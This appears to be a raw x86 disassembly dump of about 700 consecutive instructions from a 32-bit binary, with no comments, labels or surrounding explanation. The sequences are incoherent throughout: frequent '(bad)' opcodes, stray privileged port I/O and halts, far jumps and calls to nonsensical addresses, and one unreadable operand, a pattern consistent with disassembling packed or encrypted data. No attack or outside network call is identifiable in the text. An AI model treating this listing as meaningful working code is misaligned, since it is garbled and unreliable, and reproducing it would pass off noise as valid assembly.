  40512a:	inc    edx
  40512b:	test   al,0x3a
  40512d:	xor    eax,0x1be7d6cd
  405132:	dec    ebx
  405133:	cmp    ch,BYTE PTR [ebp+0x29]
  405136:	sbb    DWORD PTR [esi],ebp
  405138:	and    eax,0x2ea65195
  40513d:	push   edi
  40513e:	dec    eax
  40513f:	xor    DWORD PTR [ebp-0x64],edi
  405142:	lods   al,BYTE PTR ds:[esi]
  405143:	jns    0x4050f3
  405145:	pop    ecx
  405146:	xor    dh,BYTE PTR ds:0x4edbf9ae
  40514c:	repnz inc edi
  40514e:	rcl    DWORD PTR [ecx],1
  405150:	or     DWORD PTR [ebp-0x79a81337],ebp
  405156:	(bad)  
  405157:	fcmove st,st(0)
  405159:	xlat   BYTE PTR ds:[ebx]
  40515a:	mov    ebp,0x6eadd203
  40515f:	fisub  WORD PTR [ecx+eax*8+0x69e0f0e2]
  405166:	shr    BYTE PTR [edx],cl
  405168:	push   ds
  405169:	cmp    edi,DWORD PTR [ecx]
  40516b:	xchg   ebp,ecx
  40516d:	mov    al,0xf9
  40516f:	adc    DWORD PTR [ebx+edi*4+0x38],0x16
  405174:	sub    edx,DWORD PTR ss:[ebx+0x6a78e756]
  40517b:	pop    ecx
  40517c:	add    ebp,edi
  40517e:	jbe    0x4051e6
  405180:	xchg   ebx,eax
  405181:	mov    edi,0xf920272e
  405186:	xlat   BYTE PTR ds:[ebx]
  405187:	dec    BYTE PTR [edx+0x27]
  40518a:	jo     0x4051b8
  40518c:	adc    eax,0xd783a834
  405191:	cmp    eax,0x89798ed7
  405196:	sahf   
  405197:	adc    eax,0x97fb2cea
  40519c:	push   cs
  40519d:	sub    ah,bh
  40519f:	push   0x2
  4051a1:	jo     0x4051f9
  4051a3:	shr    DWORD PTR [eax+eax*2+0x6737c605],cl
  4051aa:	lahf   
  4051ab:	cld    
  4051ac:	jecxz  0x4051dc
  4051ae:	ret    
  4051af:	push   ss
  4051b0:	call   0x3170:0x46173072
  4051b7:	pop    ebp
  4051b8:	hlt    
  4051b9:	mov    eax,0x7552e8f4
  4051be:	fnstenv [esi]
  4051c0:	dec    eax
  4051c1:	retf   0x4295
  4051c4:	pop    ebp
  4051c5:	out    dx,eax
  4051c6:	ror    eax,0xff
  4051c9:	ins    DWORD PTR es:[edi],dx
  4051ca:	xchg   ebp,eax
  4051cb:	pop    esp
  4051cc:	hlt    
  4051cd:	and    BYTE PTR [ebp-0x47],bl
  4051d0:	ror    ebx,cl
  4051d2:	add    al,0xd7
  4051d4:	add    al,0xe2
  4051d6:	push   0x45
  4051d8:	sub    esi,edx
  4051da:	pop    edx
  4051db:	repnz ficomp WORD PTR [edx]
  4051de:	and    eax,0x3a41e6ea
  4051e3:	sbb    BYTE PTR [ebp-0x7b74e92d],bh
  4051e9:	ins    DWORD PTR es:[edi],dx
  4051ea:	dec    esp
  4051eb:	jnp    0x405196
  4051ed:	pop    ebx
  4051ee:	int    0x43
  4051f0:	in     al,0xe9
  4051f2:	icebp  
  4051f3:	jl     0x40521c
  4051f5:	xchg   BYTE PTR [ecx],al
  4051f7:	and    al,0xe4
  4051f9:	retf   
  4051fa:	jecxz  0x40522e
  4051fc:	test   eax,0xb3eeaba5
  405201:	inc    edi
  405202:	sub    eax,0xc4891ae8
  405207:	sbb    al,0x4b
  405209:	ror    DWORD PTR [esi],0x4a
  40520c:	std    
  40520d:	jmp    0x1ca80de9
  405212:	push   ecx
  405213:	out    dx,eax
  405214:	popf   
  405215:	ror    DWORD PTR fs:[edi],1
  405218:	scas   eax,DWORD PTR es:[edi]
  405219:	loope  0x4051f6
  40521b:	and    DWORD PTR [ebp-0x3eff07a5],ecx
  405221:	pop    eax
  405222:	jmp    DWORD PTR [ebp-0x406cfca8]
  405228:	mov    ah,0xf3
  40522a:	jp     0x40528b
  40522c:	ss xchg ebx,eax
  40522e:	adc    DWORD PTR [ebx+0x65],edi
  405231:	not    BYTE PTR [edi]
  405233:	push   esp
  405234:	cmp    al,0x89
  405236:	add    eax,0xe414ea56
  40523b:	mov    fs,WORD PTR [ebp+0x38]
  40523e:	jne    0x405206
  405240:	xchg   ebp,eax
  405241:	add    ch,dh
  405243:	dec    edx
  405244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405245:	call   0x9ea5b9e1
  40524a:	icebp  
  40524b:	mov    DWORD PTR [edi],0x172a04dd
  405251:	dec    ebx
  405252:	imul   BYTE PTR [edi+0x39]
  405255:	dec    ebx
  405256:	daa    
  405257:	(bad)  [ebp-0x3611795d]
  40525d:	les    esi,FWORD PTR [ebx-0x572bff9e]
  405263:	out    0xd2,al
  405265:	add    eax,0x7c610212
  40526a:	jne    0x405221
  40526c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40526d:	add    DWORD PTR [ebp-0x43],esi
  405270:	xchg   edi,eax
  405271:	mov    dh,0x28
  405273:	jmp    0x8141:0xd9d094c5
  40527a:	mov    dl,0x85
  40527c:	dec    ebp
  40527d:	test   BYTE PTR [edi-0x3247cfcf],dh
  405283:	imul   eax,eax,0xffffff93
  405286:	out    0xd9,eax
  405288:	add    eax,0x9a550154
  40528d:	inc    ebp
  40528e:	dec    ecx
  405290:	dec    eax
  405291:	mov    DWORD PTR ds:0xfedbef9c,ecx
  405297:	mov    ds:0x779194f8,eax
  40529c:	enter  0xbad,0x18
  4052a0:	xchg   esi,eax
  4052a1:	xor    eax,0x60ad18b9
  4052a6:	bound  eax,QWORD PTR [ecx+0x394d99a3]
  4052ac:	xlat   BYTE PTR ds:[ebx]
  4052ad:	clc    
  4052ae:	gs loopne 0x40529f
  4052b1:	dec    ebx
  4052b2:	sahf   
  4052b3:	fldenv [ecx]
  4052b5:	ins    BYTE PTR es:[edi],dx
  4052b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052b7:	repnz call 0x4038:0xb9a821ab
  4052bf:	les    eax,FWORD PTR [ecx]
  4052c1:	and    ebx,edx
  4052c3:	mov    bl,0x9a
  4052c5:	or     DWORD PTR [ebx],ebp
  4052c7:	outs   dx,BYTE PTR ds:[esi]
  4052c8:	inc    edx
  4052c9:	inc    ebx
  4052ca:	push   ds
  4052cb:	ins    BYTE PTR es:[edi],dx
  4052cc:	sti    
  4052cd:	lahf   
  4052ce:	aaa    
  4052cf:	cli    
  4052d0:	icebp  
  4052d1:	push   es
  4052d2:	mov    ebx,0xf5bbd443
  4052d7:	pop    ss
  4052d8:	sub    eax,0x7a2bb089
  4052dd:	push   es
  4052de:	sub    DWORD PTR [ecx+0x56],esi
  4052e1:	add    ch,bh
  4052e3:	lahf   
  4052e4:	loop   0x4052b7
  4052e6:	call   0xbdba2927
  4052eb:	fst    DWORD PTR [edi]
  4052ed:	pop    ds
  4052ee:	pop    esi
  4052ef:	scas   eax,DWORD PTR es:[edi]
  4052f0:	jo     0x405280
  4052f2:	push   eax
  4052f3:	adc    BYTE PTR [ecx-0x2fdadd27],bl
  4052f9:	mov    ebp,0x4244ac38
  4052fe:	sub    edi,DWORD PTR [ebx-0x55]
  405301:	aas    
  405302:	aam    0x87
  405304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405305:	loop   0x40534e
  405307:	sbb    BYTE PTR [edi-0x2eb1524c],bl
  40530d:	add    BYTE PTR [esp+edx*8+0x44],dh
  405311:	ror    DWORD PTR [edx-0x38],cl
  405314:	cmc    
  405315:	push   ebp
  405316:	int    0x76
  405318:	pusha  
  405319:	mov    eax,0x809dc46f
  40531e:	inc    esi
  40531f:	push   esp
  405320:	push   ds
  405321:	pop    es
  405322:	mov    BYTE PTR ds:0x2fa0fe67,ch
  405328:	sub    BYTE PTR [edi-0x320e3c32],bh
  40532e:	dec    esi
  40532f:	mov    WORD PTR [edx-0x44],ds
  405332:	push   edi
  405333:	add    edx,ebp
  405335:	mov    ebp,0x90c4cfc7
  40533a:	lods   eax,DWORD PTR ds:[esi]
  40533b:	cmp    BYTE PTR [ecx+0x17d1c1ed],ah
  405341:	inc    edx
  405342:	sbb    bh,ch
  405344:	dec    edx
  405345:	ds scas al,BYTE PTR es:[edi]
  405347:	fstp   DWORD PTR [esi+0x5b]
  40534a:	les    ebx,FWORD PTR [eax+0x4]
  40534d:	mov    eax,0x84ce23cf
  405352:	push   esp
  405353:	retf   
  405354:	mov    ds:0xe2b41d46,eax
  405359:	ret    0xefb2
  40535c:	jp     0x4052e0
  40535e:	es ret 0x4828
  405362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405363:	inc    eax
  405364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405365:	outs   dx,DWORD PTR ds:[esi]
  405366:	mov    es,edi
  405368:	push   esi
  405369:	call   0x6593feb8
  40536e:	or     BYTE PTR [ebp-0x29cc0256],dh
  405374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405375:	or     ebx,DWORD PTR [esi-0x50]
  405378:	shr    DWORD PTR [ebp+0x62],cl
  40537b:	mov    ah,0x99
  40537d:	lods   eax,DWORD PTR ds:[esi]
  40537e:	mov    WORD PTR [ebp-0x637481c4],es
  405384:	sbb    BYTE PTR [ecx-0x63d9d70d],dh
  40538a:	sar    eax,0x62
  40538d:	add    eax,0x2b9600a6
  405392:	cmp    eax,0x7bf90031
  405397:	xor    al,0xfb
  405399:	jecxz  0x405375
  40539b:	adc    al,0x56
  40539d:	xor    ch,BYTE PTR [ebp-0x39]
  4053a0:	dec    esp
  4053a1:	daa    
  4053a2:	mov    dh,0xa1
  4053a4:	pusha  
  4053a5:	sub    BYTE PTR [eax],0x43
  4053a8:	shr    BYTE PTR [ebx-0x18449806],cl
  4053ae:	push   ebx
  4053af:	inc    ebx
  4053b0:	fstp   DWORD PTR [esi+0x6cec4c5c]
  4053b6:	mov    bl,BYTE PTR [eax]
  4053b8:	mov    al,0x60
  4053ba:	repz push 0x26
  4053bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053be:	sar    al,0x13
  4053c1:	pop    DWORD PTR [ebp+0x51]
  4053c4:	loopne 0x4053d7
  4053c6:	jmp    0xb030ecc9
  4053cb:	stos   BYTE PTR es:[edi],al
  4053cc:	cdq    
  4053cd:	adc    eax,0x6cbfb3a
  4053d2:	mov    bh,0xa9
  4053d4:	gs jmp 0x62bbbb6d
  4053da:	mov    ch,0xfb
  4053dc:	test   al,0x8b
  4053de:	cmp    eax,DWORD PTR [edi-0x60f63476]
  4053e4:	push   ss
  4053e5:	clc    
  4053e6:	mov    esi,0x6add04ba
  4053eb:	loop   0x40538c
  4053ed:	add    BYTE PTR [eax],ch
  4053ef:	and    DWORD PTR [edx+eax*4-0x15c05f0a],0xffffff83
  4053f7:	stc    
  4053f8:	mov    edi,0x7b7e9277
  4053fd:	sbb    eax,0x8bb40e42
  405402:	and    BYTE PTR [ecx-0x1a0046b],ch
  405408:	pop    edx
  405409:	jmp    0x405479
  40540b:	rol    esi,1
  40540d:	sahf   
  40540e:	dec    ebp
  40540f:	das    
  405410:	cdq    
  405411:	in     al,dx
  405412:	mov    esi,0x5ac9e9a2
  405417:	xor    eax,0x9fcaf9b2
  40541c:	sar    DWORD PTR [ebx-0x6f0dcc76],cl
  405422:	cmp    DWORD PTR [eax-0x53c64efa],edx
  405428:	dec    ecx
  405429:	sub    DWORD PTR [ecx],edx
  40542b:	cmp    esi,ebp
  40542d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40542e:	and    cl,BYTE PTR [esi+0x61]
  405431:	pop    edi
  405432:	mov    ah,0xc6
  405434:	pop    ebp
  405435:	(bad)  
  405436:	and    esi,DWORD PTR [esi+0x9]
  405439:	sbb    dl,cl
  40543b:	pop    esp
  40543c:	cmc    
  40543d:	mov    cl,0xca
  40543f:	outs   dx,BYTE PTR ds:[esi]
  405440:	arpl   WORD PTR [ebx+edx*1-0x55],si
  405444:	mov    ebp,0xc2dffb71
  405449:	pusha  
  40544a:	ret    0xec51
  40544d:	xchg   ecx,eax
  40544e:	sub    edx,DWORD PTR [edx-0x61]
  405451:	jl     0x40541f
  405453:	fsubr  QWORD PTR [edi-0x671ff068]
  405459:	test   eax,0x80154ca0
  40545e:	push   ds
  40545f:	dec    eax
  405460:	mov    eax,0x6cb2d186
  405465:	jle    0x4054c0
  405467:	das    
  405468:	add    bh,BYTE PTR [eax]
  40546a:	popa   
  40546b:	(bad)  
  40546c:	test   BYTE PTR [ebx],0x7e
  40546f:	pop    ss
  405470:	maskmovq mm6,mm7
  405473:	test   edx,ebp
  405475:	inc    esp
  405476:	stos   BYTE PTR es:[edi],al
  405477:	jae    0x40543c
  405479:	ss ds jp 0x4054f3
  40547d:	rcr    BYTE PTR [esi+0x28],0xc0
  405481:	sti    
  405482:	or     cl,BYTE PTR [edi-0x21]
  405485:	adc    BYTE PTR [ecx],ch
  405487:	addr16 (bad) 
  405489:	push   ss
  40548a:	rcr    DWORD PTR [eax+0xdb8eb66],1
  405490:	xor    eax,0x7d21e575
  405495:	retf   
  405496:	retf   0x8e76
  405499:	mov    dh,0x30
  40549b:	sbb    eax,0xaf03c050
  4054a0:	sub    ebp,DWORD PTR [edx]
  4054a2:	xor    bh,BYTE PTR [eax+ecx*1-0x3acb8c5]
  4054a9:	rcl    dl,1
  4054ab:	out    0x26,al
  4054ad:	adc    eax,0xabc3794b
  4054b2:	sub    BYTE PTR [edi-0x7b],ah
  4054b5:	lea    edx,[edi]
  4054b7:	inc    esp
  4054b8:	pop    edi
  4054b9:	mov    ebx,0xf8e0da0e
  4054be:	mov    dh,0x5b
  4054c0:	out    dx,eax
  4054c1:	test   BYTE PTR [ebx+edi*8],ah
  4054c4:	into   
  4054c5:	mov    ebp,0xee24c2f6
  4054ca:	ins    DWORD PTR es:[edi],dx
  4054cb:	add    dl,BYTE PTR [ecx-0x9]
  4054ce:	das    
  4054cf:	jmp    0x912959e1
  4054d4:	ins    DWORD PTR es:[edi],dx
  4054d5:	cmp    DWORD PTR [esi],ebp
  4054d7:	xchg   ebx,eax
  4054d8:	out    0x4c,al
  4054da:	out    dx,eax
  4054db:	rcl    BYTE PTR [ebx+0x6a],1
  4054de:	or     eax,0xc81265ef
  4054e3:	in     eax,0x45
  4054e5:	xor    BYTE PTR [ecx],0xc
  4054e8:	out    0x35,al
  4054ea:	leave  
  4054eb:	int    0xce
  4054ed:	call   0xfdf3a6ea
  4054f2:	mov    al,0x80
  4054f4:	icebp  
  4054f5:	mov    ch,0x39
  4054f7:	push   0xf2ffd63
  4054fc:	add    dh,BYTE PTR [esi]
  4054fe:	and    DWORD PTR [ebx-0x116abbd4],edx
  405504:	push   0xffffffe5
  405506:	fisubr WORD PTR [ecx-0x42ab1362]
  40550c:	dec    edi
  40550d:	mov    dh,0xf8
  40550f:	dec    ebp
  405510:	inc    edx
  405511:	jle    0x40556f
  405513:	(bad)  
  405514:	clc    
  405515:	mov    al,0x61
  405517:	ss loope 0x405584
  40551a:	(bad)  
  40551b:	fstp   DWORD PTR [ecx-0x5c]
  40551e:	cmp    cl,al
  405520:	sti    
  405521:	pop    edi
  405522:	fs daa 
  405524:	xchg   esp,eax
  405525:	push   ecx
  405526:	fwait
  405527:	ret    
  405528:	jmp    0x405512
  40552a:	pop    ds
  40552b:	pop    es
  40552c:	fisttp QWORD PTR [ecx-0x6d]
  40552f:	into   
  405530:	icebp  
  405531:	xlat   BYTE PTR ds:[ebx]
  405532:	(bad)
  405535:	ret    
  405536:	in     al,0xd8
  405538:	test   eax,0x4799e1a1
  40553d:	imul   esp,DWORD PTR [ebx+0x44fd4407],0xffffffbc
  405544:	leave  
  405545:	cmp    eax,0x2a36d162
  40554a:	es pop eax
  40554c:	out    dx,eax
  40554d:	cmc    
  40554e:	push   es
  40554f:	je     0x40559d
  405551:	stos   DWORD PTR es:[edi],eax
  405552:	ret    
  405553:	repnz iret 
  405555:	mov    ebx,0xd0966228
  40555a:	mov    ah,0x44
  40555c:	sbb    eax,0x2b1eef57
  405561:	mov    ecx,DWORD PTR [edx+eax*1]
  405564:	pop    ecx
  405565:	mov    ds:0xf2dce2df,al
  40556a:	sbb    al,0x7
  40556c:	out    0xa7,eax
  40556e:	dec    ecx
  40556f:	inc    ebx
  405570:	not    BYTE PTR [ebx+eiz*2+0x28]
  405574:	inc    ebx
  405575:	pop    esi
  405576:	cld    
  405577:	pop    ecx
  405578:	cld    
  405579:	add    al,0x5d
  40557b:	push   ebp
  40557c:	jp     0x40552e
  40557e:	and    al,bl
  405580:	sub    al,0x76
  405582:	add    BYTE PTR [edi-0x7a09d7c8],al
  405588:	(bad)  
  405589:	xor    eax,0x164f5fdc
  40558e:	inc    ebx
  40558f:	mov    dh,0xe8
  405591:	xchg   esp,eax
  405592:	pop    edx
  405593:	bound  ebx,QWORD PTR [ebp-0x48]
  405596:	cli    
  405597:	mov    esi,0x265fb83e
  40559c:	add    DWORD PTR [edx],0x54
  40559f:	add    al,0x85
  4055a1:	sbb    DWORD PTR [edx+ebp*8],0xffffffb6
  4055a5:	sbb    al,0x0
  4055a7:	cmp    al,0x44
  4055a9:	and    DWORD PTR [edx+eax*8+0x17632dd0],esi
  4055b0:	xchg   ecx,eax
  4055b1:	mov    ch,0x98
  4055b3:	or     eax,esi
  4055b5:	test   eax,0x165695f7
  4055ba:	mov    bl,0xa4
  4055bc:	outs   dx,DWORD PTR ds:[esi]
  4055bd:	loop   0x40554d
  4055bf:	sub    al,0x73
  4055c1:	push   0x48
  4055c3:	and    eax,0x921b982a
  4055c8:	jns    0x405602
  4055ca:	ret    0xb1d4
  4055cd:	mov    esp,0xf7bd2789
  4055d2:	mov    ah,BYTE PTR [edx+0x2e5e3b95]
  4055d8:	or     DWORD PTR [ebx-0x7b],0xfdb7bcec
  4055df:	sub    al,0xfe
  4055e1:	xor    cl,BYTE PTR [eax]
  4055e3:	pcmpeqw mm1,QWORD PTR fs:[esi+0x54]
  4055e8:	mov    eax,ds:0x4d807661
  4055ed:	pop    edx
  4055ee:	mov    ebx,0x2884a4b1
  4055f3:	inc    BYTE PTR [ebp-0x4d18c275]
  4055f9:	mov    dh,0xc4
  4055fb:	test   eax,0x6fe870fe
  405600:	test   al,0xff
  405602:	lods   al,BYTE PTR ds:[esi]
  405603:	adc    ah,0x16
  405606:	xchg   ebp,eax
  405607:	adc    edx,ecx
  405609:	fwait
  40560a:	retf   0x885d
  40560d:	leave  
  40560e:	ja     0x4055e6
  405610:	cmp    BYTE PTR [edx-0x873e92b],0x10
  405617:	cmp    al,0xd1
  405619:	push   0x2
  40561b:	cli    
  40561c:	push   esi
  40561d:	adc    al,0x52
  40561f:	mov    bl,BYTE PTR [esp+ebx*8+0x42]
  405623:	jo     0x405644
  405625:	mov    ?,esp
  405627:	jl     0x405602
  405629:	push   es
  40562a:	loopne 0x4055c4
  40562c:	jge    0x405695
  40562e:	out    dx,eax
  40562f:	mov    cl,0x97
  405631:	adc    al,ah
  405633:	cmp    DWORD PTR [ecx-0x27],ecx
  405636:	and    al,0xb9
  405638:	or     esi,esi
  40563a:	cld    
  40563b:	stc    
  40563c:	xlat   BYTE PTR ds:[ebx]
  40563d:	jecxz  0x405672
  40563f:	mov    ah,0x99
  405641:	fldenv [esi-0x36]
  405644:	dec    ecx
  405645:	bound  ecx,QWORD PTR [eax]
  405647:	push   ebx
  405648:	fisttp WORD PTR [ebx*1-0x75d3c10f]
  40564f:	stos   DWORD PTR es:[edi],eax
  405650:	pop    edx
  405651:	mov    bl,0x88
  405653:	aaa    
  405654:	xor    eax,0x93da09cb
  405659:	ret    
  40565a:	jo     0x40567a
  40565c:	cmp    DWORD PTR [ebx],ecx
  40565e:	ficomp WORD PTR [ebx+edi*1-0x21]
  405662:	cld    
  405663:	ror    BYTE PTR [ebx+eiz*4],0xbd
  405667:	sti    
  405668:	mov    ds:0x6362b8f,al
  40566d:	or     al,BYTE PTR [eax-0x56]
  405670:	lea    eax,[ebx+esi*8-0x78]
  405674:	jmp    0x130b:0x3a3f108a
  40567b:	stc    
  40567c:	je     0x405657
  40567e:	jo     0x405610
  405680:	(bad)  
  405681:	cli    
  405682:	mov    ebx,0x581b2c5e
  405687:	inc    edx
  405688:	adc    al,0x8a
  40568a:	xchg   ecx,eax
  40568b:	lds    eax,FWORD PTR [ebx-0x55]
  40568e:	xor    ebp,ebp
  405690:	mov    bh,BYTE PTR [ebx-0x75]
  405693:	std    
  405694:	jl     0x405699
  405696:	fstp   TBYTE PTR [ecx-0x8]
  405699:	ja     0x4056f4
  40569b:	sbb    BYTE PTR [ecx*8+0x44a9d8b2],bl
  4056a2:	jb     0x40564b
  4056a4:	outs   dx,DWORD PTR ds:[esi]
  4056a5:	dec    edx
  4056a6:	mov    eax,ds:0x91aaa88
  4056ab:	or     al,BYTE PTR [ebp+0x3c948c7e]
  4056b1:	mov    ds:0x9e964c48,eax
  4056b6:	push   edi
  4056b7:	pop    edi
  4056b8:	push   ebp
  4056b9:	div    DWORD PTR [ecx-0xe9d8d9e]
  4056bf:	pusha  
  4056c0:	mov    eax,ds:0xd764d3b7
  4056c5:	or     DWORD PTR [ecx-0x7],ebx
  4056c8:	aam    0x44
  4056ca:	iret   
  4056cb:	test   BYTE PTR [ebp-0x4e77ff95],al
  4056d1:	jmp    0x27f6:0xb5f423b1
  4056d8:	and    bl,ah
  4056da:	out    dx,eax
  4056db:	rcr    DWORD PTR [edx+0x555596d9],1
  4056e1:	stc    
  4056e2:	and    eax,0x1acdfc1a
  4056e7:	push   eax
  4056e8:	mov    bl,0x5e
  4056ea:	inc    edi
  4056eb:	int3   
  4056ec:	mov    dl,0x30
  4056ee:	sbb    eax,0x35f6f3a4
  4056f3:	idiv   DWORD PTR [esi]
  4056f5:	pop    ebx
  4056f6:	xchg   ebx,eax
  4056f7:	push   0x5a5d0706
  4056fc:	add    bh,BYTE PTR [esi+0x3e6f75eb]
  405702:	push   edx
  405703:	or     eax,0xed3604ab
  405708:	(bad)  
  405709:	jge    0x4056be
  40570b:	int3   
  40570c:	lahf   
  40570d:	retf   0x947e
  405710:	(bad)  
  405712:	ret    0x66d8
  405715:	xchg   esp,eax
  405716:	fs dec esi
  405718:	sub    al,0x19
  40571a:	int    0x98
  40571c:	xchg   edx,eax
  40571d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40571f:	fdivr  DWORD PTR [ecx-0x445d3d14]
  405725:	xor    DWORD PTR [eax-0x47],0xcd824a4a
  40572c:	ret    
  40572d:	inc    edi
  40572e:	call   0x59740960
  405733:	or     DWORD PTR [edx],0x43be3c5e
  405739:	sub    ebx,esp
  40573b:	dec    edx
  40573c:	ror    ah,cl
  40573e:	add    eax,0xec3ccb60
  405743:	rep ins DWORD PTR es:[edi],dx
  405745:	xor    ah,BYTE PTR [edx+0x34]
  405748:	cli    
  405749:	or     BYTE PTR [edx-0x62191926],0x9e
  405750:	retf   
  405751:	xor    dl,BYTE PTR [ebx]
  405753:	xlat   BYTE PTR ds:[ebx]
  405754:	scas   al,BYTE PTR es:[edi]
  405755:	ins    BYTE PTR es:[edi],dx
  405756:	mov    dh,0x59
  405758:	cmp    eax,0x591e0f91
  40575d:	retf   
  40575e:	scas   al,BYTE PTR es:[edi]
  40575f:	xor    ebp,DWORD PTR [ebx]
  405761:	loope  0x405708
  405763:	jnp    0x405743
  405765:	pop    ecx
  405766:	cdq    
  405767:	xchg   ebx,eax
  405768:	test   al,0x34
  40576a:	call   0xa224e7cd
  40576f:	loop   0x405789
  405771:	mov    ah,0xd9
  405773:	fcomp  DWORD PTR [ebp+0x416503f2]
  405779:	xchg   ebp,eax
  40577a:	pop    esp
  40577b:	cli    
  40577c:	rcr    eax,0x27
  40577f:	mov    ebx,0xe41fb7d3
  405784:	xchg   edi,eax
  405785:	add    DWORD PTR [eax-0x3c],esi
  405788:	icebp  
  405789:	jb     0x405767
  40578b:	mov    edi,DWORD PTR [edi+ecx*4+0x5c]
  40578f:	fdivr  st(0),st
  405791:	cld    
  405792:	pop    eax
  405793:	sbb    BYTE PTR [ecx+0x55],0x9c
  405797:	cwde   
  405798:	iret   
  405799:	dec    ebx
  40579a:	fist   WORD PTR ds:0x81e8e3c4
  4057a0:	pop    edx
  4057a1:	pusha  
  4057a2:	push   0x74
  4057a4:	xchg   BYTE PTR [ebx+0x141cea1a],bl
  4057aa:	fwait
  4057ab:	adc    al,0xd9
  4057ad:	add    BYTE PTR [eax+0x12784b7a],dl
  4057b3:	xor    cl,BYTE PTR [edi]
  4057b5:	pop    esi
  4057b6:	lods   eax,DWORD PTR ds:[esi]
  4057b7:	xor    BYTE PTR [esi],ch
  4057b9:	add    ebx,DWORD PTR [esi+esi*8-0x3a]
  4057bd:	nop
  4057be:	mov    al,0x41
  4057c0:	pop    ds
  4057c1:	lock retf 
  4057c3:	rcr    DWORD PTR [esi-0x7a6f419],0xbe
  4057ca:	(bad)  
  4057cb:	dec    esi
  4057cc:	push   ds
  4057cd:	adc    esi,esp
  4057cf:	pop    esi
  4057d0:	add    BYTE PTR [edx-0x39],ah
  4057d3:	imul   ebx,DWORD PTR [eax],0x24
  4057d6:	lock or ebp,esi
  4057d9:	int    0xff
  4057db:	mov    ebp,0x6403d4d9
  4057e0:	jecxz  0x40584f
  4057e2:	ins    BYTE PTR es:[edi],dx
  4057e3:	nop
  4057e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057e5:	jp     0x4057f7
  4057e7:	fisttp WORD PTR [ebp+0x23]
  4057ea:	mov    dl,0x8e
  4057ec:	das    
  4057ed:	imul   edx,DWORD PTR fs:[edx],0xffffffa1
  4057f1:	outs   dx,DWORD PTR ds:[esi]
  4057f2:	in     al,dx
  4057f3:	and    BYTE PTR [ecx+0x32],ch
  4057f6:	xlat   BYTE PTR ds:[ebx]
  4057f7:	mov    al,0xfa
  4057f9:	xor    bh,bl
  4057fb:	es mov dh,0xc6
  4057fe:	retf   0x7fec
  405801:	mov    ds:0xcaea4c4a,eax
  405806:	(bad)  
  405807:	jmp    0x31ca:0xa2165cff
  40580e:	pop    ebx
  40580f:	pop    ss
  405810:	pop    ss
  405811:	or     bl,BYTE PTR [ecx-0x28]
  405814:	xor    dx,0x7492
  405819:	lahf   
  40581a:	dec    esi
  40581b:	dec    edx
  40581c:	shl    DWORD PTR ds:0x3fc0440b,1
  405822:	mov    ebp,DWORD PTR [eax]
  405824:	jns    0x405860
  405826:	mov    al,0xfd
  405828:	lock clc 
  40582a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40582b:	xchg   ebp,eax
  40582c:	scas   al,BYTE PTR es:[edi]
  40582d:	push   ebp
  40582e:	je     0x405822
  405830:	loope  0x405871
  405832:	jg     0x4057ea
  405834:	mov    ds:0x5534d281,al
  405839:	push   0xe3acd805
  40583e:	loop   0x405850
  405840:	push   esi
  405841:	out    dx,al
  405842:	xor    esp,DWORD PTR [eax+0xf]
  405845:	xchg   BYTE PTR [edx],ch
  405847:	adc    bl,cl
  405849:	gs out dx,eax
  40584b:	jg     0x40580e
  40584d:	and    al,0xa1
  40584f:	(bad)  
  405850:	sbb    eax,0xb24c5abe
  405855:	xor    dh,BYTE PTR [esi]
  405857:	in     al,0x10
  405859:	fcomp  DWORD PTR [esi-0x8069979]
  40585f:	inc    esp
  405860:	imul   ebx,edi,0x90d175c8
  405866:	mov    cl,ah
  405868:	or     DWORD PTR [ecx],esp
  40586a:	scas   eax,DWORD PTR es:[edi]
  40586b:	nop
  40586c:	cmp    eax,0x4ae5ec22
  405871:	ins    DWORD PTR es:[edi],dx
  405872:	and    esp,eax
  405874:	(bad)  
  405875:	jge    0x405842
  405877:	arpl   WORD PTR [ecx+0x3c],cx
  40587a:	inc    ebp
  40587b:	sbb    edi,DWORD PTR [esi+eiz*2-0x2]
  40587f:	(bad)  [edi]
  405881:	clc    
  405882:	mov    dh,0xb1
  405884:	stos   DWORD PTR es:[edi],eax
  405885:	out    0x47,eax
  405887:	in     al,dx
  405888:	fistp  QWORD PTR [eax+0x57]
  40588b:	dec    esp
  40588c:	adc    DWORD PTR [bp+di],eax
  40588f:	jmp    0xb03:0xc23a1243
  405896:	and    DWORD PTR [ebp-0x1f],ebp
  405899:	jnp    0x405834
  40589b:	shl    DWORD PTR [eax-0x68042e3b],1
  4058a1:	sbb    eax,0x8750e929
  4058a6:	jb     0x405874
  4058a8:	push   edi
  4058a9:	sub    ah,BYTE PTR [ecx]
  4058ab:	enter  0x1180,0x25
  4058af:	lahf   
  4058b0:	mov    ebp,0x9f96bac3
  4058b5:	shl    DWORD PTR [esi+ebx*8-0x24],0xc5
  4058ba:	add    BYTE PTR [ecx-0x46],0x45
  4058be:	xor    eax,0xde0de990
  4058c3:	cmp    eax,0x7bdfce5
  4058c8:	lds    eax,FWORD PTR [ebx+0x7a382daf]
  4058ce:	cld    
  4058cf:	ret    
  4058d0:	or     al,0x7
  4058d2:	xchg   ebp,eax
  4058d3:	dec    ebp
  4058d4:	xchg   esp,eax
  4058d5:	sub    eax,0x3c09ad5d
  4058da:	push   DWORD PTR [ecx]
  4058dc:	in     al,dx
  4058dd:	mov    ecx,0xa4952f2d
  4058e2:	jp     0x40589b
  4058e4:	int    0xc1
  4058e6:	sbb    DWORD PTR [esi-0xb1fc56d],esp
  4058ec:	dec    ecx
  4058ed:	js     0x40593e
  4058ef:	or     esp,esi
  4058f1:	sbb    al,0x24
  4058f3:	pushf  
  4058f4:	scas   al,BYTE PTR es:[edi]
  4058f5:	ret    
  4058f6:	(bad)  
  4058f7:	imul   DWORD PTR [ecx+eiz*4+0x7ab906b]
  4058fe:	cmp    al,0xc
  405900:	push   edi
  405901:	outs   dx,BYTE PTR ds:[esi]
  405902:	adc    ah,BYTE PTR [esp+esi*8+0x5f]
  405906:	push   0x64f067cc
